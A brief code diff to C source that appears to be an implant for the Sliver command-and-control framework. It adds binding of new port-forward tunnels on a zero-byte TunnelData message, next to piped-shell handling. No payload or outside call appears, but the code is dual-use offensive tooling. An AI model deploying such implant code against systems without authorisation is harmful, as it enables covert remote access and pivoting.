@@ -272,6 +272,11 @@ int sliver_rpc_handle_tunnel_data(const sliver_envelope_t *req, sliver_buf_t *ou
   if (sliver_portfwd_tunnel_data(&td)) {
     return -2;
   }
+  /* Unknown tunnel id: the client binds a freshly created tunnel with a zero
+   * byte TunnelData before sending PortfwdReq - acknowledge it. */
+  if (sliver_portfwd_bind(td.tunnel_id)) {
+    return -2;
+  }
   t = tunnel_find(td.tunnel_id);
   if (t == NULL) {
     return -2;
@@ -311,6 +316,7 @@ int sliver_rpc_handle_shell_resize(const sliver_envelope_t *req, sliver_buf_t *o
   (void)out;
   return -2; /* piped shells have no window size */
 }
+
 
 
 
